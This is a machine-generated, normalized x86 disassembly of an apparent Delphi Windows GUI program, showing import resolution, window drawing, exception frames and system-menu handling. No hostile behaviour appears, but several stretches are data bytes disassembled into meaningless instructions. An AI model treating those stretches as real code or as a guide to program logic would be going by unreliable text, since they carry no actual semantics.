cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42c72c
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42c754
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c79c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7a3
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403368
call sub_42be08
cmp [ rw-data ] 0x0
jg r-xdata
sub_42c7c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c7e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7f0
retn
sub_42c7fc
add al cl
inc edx
add [ ebx ] al
or edx [ ebp + eax * 2 + 0x64 ]
inc edx
outsd
jb r-xdata
add [ eax ] al
pop eax
enter 0x42 0x6
jb r-xdata
add [ ebp + esi + 0x12480040 ] ah
outsd
outsb
or [ gs : ebp + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x73650964
dec esp
outsd
ja r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah bh
mov [ edx ] 0x4c626506
je r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cld
mov al 0x44
jb r-xdata
pop es
bound edx [ gs : edx + 0x69 ]
push 0x62650874
inc edx
outsd
je r-xdata
bound edx [ gs : edi + ebp * 2 + 0x70 ]
add [ esp + eax * 4 + 0x44 ] bl
add [ eax - 0x63ffbb49 ] ch
lea eax [ eax + eax + 0xc ]
sbb [ edx ] eax
hlt
pop es
push esp
outsd
outsd
insb
push edi
imul ebp [ esi - 0x70 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul st1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insd
pop es
push esp
outsd
outsd
insb
push edi
imul ebp [ esi + 0x44 ] 0x60042c8
or al 0x54
inc ebp
inc edx
outsd
jb r-xdata
add [ eax - 0x35ffbd37 ] dh
leave
inc edx
add [ edx + eax ] cl
add [ eax ] al
hlt
jb r-xdata
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
add esp edi
mov [ edx ] 0x42c85c90
add [ ebx ] al
or dl [ ebp + eax * 2 + 0x64 ]
push ebx
je r-xdata
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x38 ] bl
inc edx
add [ esi ] al
sub_42c8c1
push ecx
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
sub_42ca04
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
or edx [ esp + edx * 2 + 0x6f ]
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0xc8e4776f
inc edx
add [ eax + 0xb004455 ] ch
add [ edi ] al
push esp
outsd
outsd
insb
push edi
imul ebp [ esi ] r-xdata
dec esp
0x42
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x35 ] al
inc edx
add [ esi - 0x35 ] ah
inc edx
add [ ebx + eax ] cl
add [ eax ] al
mov al [ 0xfffffffff40045f4 ]
sbb [ edx ] al
sub [ ebx ] dl
inc esi
add ah bl
adc al 0x46
add [ ebp + esi + 0x39480040 ] ch
inc esi
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + edx + 0x46 ] al
add ah cl
add al [ ebp ]
mov ah 0x1a
inc esi
add [ esi + ecx * 4 + 0x5fa80041 ] dh
inc esi
add [ eax + 0x17 ] al
inc esi
add [ eax + ebx + 0x46 ] cl
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah al
and [ esi ] al
in al dx
adc eax 0x5c640042
inc esi
add [ eax - 0x32 ] dl
inc edx
add [ eax - 0x3ffbd32 ] ch
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ ebp + ebx - 0xa6bffba ] ah
inc esp
add [ eax ] bl
add [ eax + eax + 0x1c ] 0x82
inc esp
add [ eax - 0x7bffb9e2 ] bl
mov dl 0x44
add [ ebp + ecx * 4 - 0x7c6bffbc ] al
inc esp
add [ eax ] dl
pop [ eax + eax - 0x74 ]
and [ esi ] al
pop eax
pop ds
inc esi
add [ eax - 0x70 ] cl
inc esp
add [ ecx ] al
inc esi
add [ eax ] cl
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x63ffbb0a ] cl
adc [ esi ] al
test al 0x27
inc esi
add [ esp + ecx * 8 + 0x44 ] dl
add [ esi + ecx * 8 + 0x37cc0042 ] dl
inc esi
add [ eax - 0x13ffb9ca ] cl
int3
sub_42cb0e
inc esp
add [ edx * 2 + 0xa900046 ] cl
inc esi
add [ eax + 0xd ] al
inc esi
add ah ch
inc ebp
inc esi
add [ eax ] ch
push ss
inc esi
add [ esi + edx + 0x58ec0046 ] ah
inc esi
add [ eax + 0x13 ] ah
inc esi
add al dh
push ebx
inc esi
add al dl
cmp al [ esi ]
movsb [ edi ] [ esi ]
push ebp
inc esi
add [ eax + 0x6004620 ] cl
add ch al
inc [ ecx - 0x5eff7c00 ]
add [ 0x30011200 ] al
rol [ edx ] 0x1
aam 0xd0
inc edx
add al bh
rol [ edx ] 0x1
hlt
sub_42cb9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4e0
mov al [ r-xdata ]
mov [ esi + 0x208 ] al
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x20a ] 0x2
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42cbf0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x208 ] al
mov eax ebx
call sub_44cd54
sub_42cc40
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
lea edi [ esp + 0x10 ]
push esp
mov eax ebx
call sub_44f7b4
push eax
call GetClientRect
push edi
mov eax ebx
call sub_44f7b4
push eax
call GetWindowRect
push 0x2
push edi
mov eax ebx
call sub_44f7b4
push eax
push 0x0
call MapWindowPoints
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
push esi
call ExcludeClipRect
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
push edi
call OffsetRect
xor eax eax
mov al [ ebx + 0x208 ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x209 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
push eax
push edi
push esi
call DrawEdge
mov eax [ edi + 0xc ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
push esi
call IntersectClipRect
mov eax [ ebx + 0x170 ]
call sub_4249d8
push eax
push edi
push esi
call FillRect
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_42cd30
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov esi [ edi + 0x8 ]
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov ebp esi
push ebp
call InflateRect
xor eax eax
cmp [ ebx + 0x209 ] 0x0
je r-xdata
cmp [ ebx + 0x20a ] 0x0
je r-xdata
inc eax
mov esi ebp
test [ ebx + 0x208 ] 0x1
je r-xdata
inc eax
test [ ebx + 0x208 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x208 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x208 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
mov edx edi
mov eax ebx
call sub_45055c
pop ebp
pop edi
pop esi
pop ebx
retn
sub [ esi + 0xc ] eax
sub_42cdac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42ce02
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce09
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ReleaseDC
retn
sub_42ce4d
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_465e3c
mov edx 0x1
mov eax esi
call sub_44f8d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42cea8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov bl 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x309 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x308 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e250
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
mov esi [ ebp - 0xc ]
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x308 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
add esi [ eax + 0x300 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2fc ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e264
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x18 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x18 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x309 ] 0x1
xor eax eax
push ebp
push sub_42cfe2
push [ fs : eax ]
mov [ fs : eax ] esp
sub edi [ ebp - 0x10 ]
push edi
sub esi [ ebp - 0x14 ]
push esi
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfe9
mov eax [ ebp - 0x4 ]
mov [ eax + 0x309 ] 0x0
retn
mov eax [ ebp - 0x4 ]
add edi [ eax + 0x304 ]
jmp r-xdata
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_42cfe9
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
add eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0xc ]
cmp eax [ edx ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d030
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_465ea4
xor edx edx
mov eax ebx
call sub_4484a0
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
pop esi
pop ebx
retn
sub_42d054
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
sub_42d0d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_46437c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_42d054
pop ecx
sub_42d0f8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_466020
mov edx esp
mov eax esi
call sub_448954
push 0x20
call GetSystemMetrics
mov esi eax
push 0x21
call GetSystemMetrics
neg eax
push eax
neg esi
push esi
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov eax [ ebx + 0xc ]
cmp eax 0x11
ja r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov al [ eax + lookup_table_42d14c ]
jmp [ eax * 4 + jump_table_42d15e ]
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0x4 ]
jge r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov [ ebx + 0xc ] 0x2
jmp r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0xc ]
jle r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
mov [ ebx + 0xc ] 0xb
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xf
jmp r-xdata
mov [ ebx + 0xc ] 0xb
mov [ ebx + 0xc ] 0xf
jmp r-xdata
sub_42d1f4
mov [ eax + 0x308 ] 0x0
mov ecx [ edx + 0x4 ]
add ecx 0xfffffff6
sub ecx 0x2
jb r-xdata
mov [ eax + 0x308 ] 0x1
jmp r-xdata
je r-xdata
call sub_466048
retn
mov [ eax + 0x308 ] 0x2
sub ecx 0x3
je r-xdata
jmp r-xdata
sub_42d228
push ebx
mov ebx eax
mov eax ebx
call sub_460f78
mov al [ ebx + 0x308 ]
dec al
je r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ ebx + 0x2fc ]
add [ ebx + 0x300 ] eax
pop ebx
retn
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
sub eax [ ebx + 0x2f8 ]
add [ ebx + 0x304 ] eax
jmp r-xdata
pop ebx
retn
sub_42d264
push ebx
mov ebx eax
mov eax [ edx + 0x4 ]
and eax 0xfff0
cmp eax 0xf000
jne r-xdata
mov eax ebx
call sub_4646b0
mov [ ebx + 0x308 ] 0x0
pop ebx
retn
xor eax eax
mov [ ebx + 0x304 ] eax
xor eax eax
mov [ ebx + 0x300 ] eax
sub_42d298
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d2bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d2c4
retn
sub_42d2d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d2f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d2fc
retn
sub_42d308
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d32d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d334
retn
sub_42d340
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d365
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d36c
retn
sub_42d378
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d39d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d3a4
retn
sub_42d3b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d3d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d3dc
retn
sub_42d3e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d40d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d414
retn
sub_42d420
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d445
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d44c
retn
sub_42d563
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421184
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_4036b4
push sub_42d6a0
call sub_422214
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
inc esp
pop edx
inc ecx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
inc esp
pop edx
inc ecx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
sub_42d60c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
test bl bl
jle r-xdata
call sub_4222ac
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42d640
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_468ffc
mov cl 0x1
sub_42d668
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4035a0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d6a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d6ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d738
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45f974
mov [ ebp - 0x14 ] eax
call sub_45f890
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42d7fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4688ec
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42d7cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d7d4
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468948
retn
sub_42d7d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d802
mov eax [ ebp - 0x14 ]
call sub_45fa28
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_45f898
retn
sub_42d8d8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_409018
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d973
add [ edi ] cl
add [ eax ] al
add [ eax + ebp + 0x48 ] dh
add ah dl
xor eax 0x48
add [ eax ] al
jo r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x28 ] ah
dec eax
add [ eax + edi + 0x48 ] bl
add [ eax ] al
pop esp
sub [ eax ] cl
cld
cmp [ eax ] ecx
add [ eax ] al
add [ eax ] al
pop eax
sub [ eax ] cl
movsb [ edi ] [ esi ]
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x48 ] dl
add ah al
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
push eax
sub [ eax ] cl
shl [ edi ] 0x1
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x48 ] cl
add [ eax + 0x3b ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub [ eax ] cl
xor al 0x36
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + ebp ] dl
dec eax
add [ eax + 0x3a ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
sub [ eax ] cl
sar [ edx ] 0x48
add [ eax ] al
